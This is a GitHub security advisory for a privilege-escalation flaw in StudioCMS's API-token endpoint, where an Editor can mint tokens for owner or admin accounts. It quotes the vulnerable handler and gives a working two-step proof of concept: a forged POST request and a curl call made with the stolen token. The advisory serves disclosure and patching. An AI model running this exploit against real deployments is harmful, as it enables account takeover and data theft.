# [H] StudioCMS has Privilege Escalation via Insecure API Token Generation

## Summary
Severity: High
Advisory: GHSA-667w-mmh7-mrr4
CVE: CVE-2026-30944
CWE: CWE-639, CWE-863
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-667w-mmh7-mrr4
Type: github-advisory

## Affected
- npm: `studiocms` — affected >=0 <0.4.0

## Details
## Summary
The /studiocms_api/dashboard/api-tokens endpoint allows any authenticated user (at least Editor) to generate API tokens for any other user, including owner and admin accounts. The endpoint fails to validate whether the requesting user is authorized to create tokens on behalf of the target user ID, resulting in a full privilege escalation.

## Details
The API token generation endpoint accepts a user parameter in the request body that specifies which user the token should be created for. The server-side logic authenticates the session (via auth_session cookie) but does not verify that the authenticated user matches the target user ID nor checks if the caller has sufficient privileges to perform this action on behalf of another user.
This is a classic BOLA vulnerability: the authorization check is limited to "is the user logged in?" instead of "is this user authorized to perform this action on this specific resource?"

#### Vulnerable Code
The following is the server-side handler for the POST /studiocms_api/dashboard/api-tokens endpoint:
**File:** packages/studiocms/frontend/pages/studiocms_api/dashboard/api-tokens.ts (lines 16–57)
**Version:** studiocms@0.3.0
```
POST: (ctx) =>
    genLogger('studiocms/routes/api/dashboard/api-tokens.POST')(function* () {
        const sdk = yield* SDKCore;

        // Check if demo mode is enabled
        if (developerConfig.demoMode !== false) {
            return apiResponseLogger(403, 'Demo mode is enabled, this action is not allowed.');
        }

        // Get user data
        const userData = ctx.locals.StudioCMS.security?.userSessionData;       // [1]

        // Check if user is logged in
        if (!userData?.isLoggedIn) {                                            // [2]
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Check if user has permission
        const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isEditor;  // [3]
        if (!isAuthorized) {
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Get Json Data
        const jsonData = yield* readAPIContextJson<{
            description: string;
            user: string;                                                       // [4]
        }>(ctx);

        // Validate form data
        if (!jsonData.description) {
            return apiResponseLogger(400, 'Invalid form data, description is required');
        }

        if (!jsonData.user) {
            return apiResponseLogger(400, 'Invalid form data, user is required');
        }

        // [5] jsonData.user passed directly — no check against userData
        const newToken = yield* sdk.REST_API.tokens.new(jsonData.user, jsonData.description);

        return createJsonResponse({ token: newToken.key });                     // [6]
    }),
```
**Analysis**
The authorization logic has three distinct flaws:
1. **Insufficient permission gate [1][2][3]:** The handler retrieves the session from ctx.locals.StudioCMS.security and only verifies that isEditor is true. This means any user with editor privileges or above passes the gate. 
2. **Missing object-level authorization [4][5]:** The user field from the JSON payload (line 54) is passed directly to sdk.REST_API.tokens.new() without any comparison against userData (the authenticated caller's identity from the session at [1]). There is no check such as jsonData.user === userData.id. This allows any authenticated user to specify an arbitrary target UUID and generate a token for that account.
3. **No target role validation [5]:** Even if cross-user token generation were an intended feature, there is no check to prevent a lower-privileged user from generating tokens for higher-privileged accounts (admin, owner).

## PoC
**Environment**
The following user roles were identified in the application:
*User ID | Role*
2450bf33-0135-4142-80be-9854f9a5e9f1 | owner
eacee42e-ae7e-4e9e-945b-68e26696ece4 | admin
2d93a386-e9cb-451e-a811-d8a34bfdf4da | admin
39b3e7d3-5eb0-48e1-abdc-ce95a57b212c | editor
a1585423-9ade-426e-a713-9c81ed035463 | visitor

**Step 1 — Generate an API Token for the Owner (as Editor)**
An authenticated Editor sends the following request, specifying the owner user ID in the body:
```
POST /studiocms_api/dashboard/api-tokens HTTP/1.1
Host: <target>
Cookie: auth_session=<editor_session_cookie>
Content-Type: application/json
Content-Length: 74

{
  "user": "2450bf33-0135-4142-80be-9854f9a5e9f1",
  "description": "pwn"
}
```
**Result:** The server returns a valid JWT token bound to the owner account.

**Step 2 — Use the Token to Access the API as Owner**
```
curl -H "Authorization: Bearer <owner_jwt_token>" http://<target>/studiocms_api/rest/v1/users
```
**Result:** The attacker now has full API access with owner privileges, including the ability to list all users, modify content, and manage the application.

## Impact
- **Privilege Escalation:** Any authenticated user (above visitor) can escalate to owner level access.
- **Full API Access:** The generated token grants unrestricted access to all REST API endpoints with the impersonated user's permissions.
- **Account Takeover:** An attacker can impersonate any user in the system by specifying their UUID.
- **Data Breach:** Access to user listings, content management, and potentially sensitive configuration data.

## References
- https://github.com/withstudiocms/studiocms/security/advisories/GHSA-667w-mmh7-mrr4
- https://nvd.nist.gov/vuln/detail/CVE-2026-30944
- https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3
- https://github.com/withstudiocms/studiocms/commit/f4a209fc090c90195e2419fff47b48a46eab7441
- https://github.com/withstudiocms/studiocms
- https://github.com/withstudiocms/studiocms/releases/tag/studiocms%400.4.0
- https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0
